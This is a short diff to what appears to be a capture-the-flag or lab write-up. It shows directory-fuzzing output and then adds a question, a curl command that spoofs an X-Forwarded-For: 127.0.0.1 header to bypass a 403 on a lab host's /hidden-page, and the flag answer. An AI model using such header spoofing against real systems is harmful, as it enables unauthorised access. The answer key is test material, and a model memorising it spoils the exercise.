@@ -128,4 +128,9 @@ ________________________________________________
 action                  [Status: 200, Size: 1023, Words: 379, Lines: 51, Duration: 24ms]
 :: Progress: [4989/4989] :: Job [1/1] :: 1639 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 
+The /hidden-page page on Meridian returns a 403 Forbidden response. What is the hidden information on the page when the access control is bypassed?
+
+curl -H "X-Forwarded-For: 127.0.0.1" http://meridian.hv/hidden-page/
+Artemis  
+
 
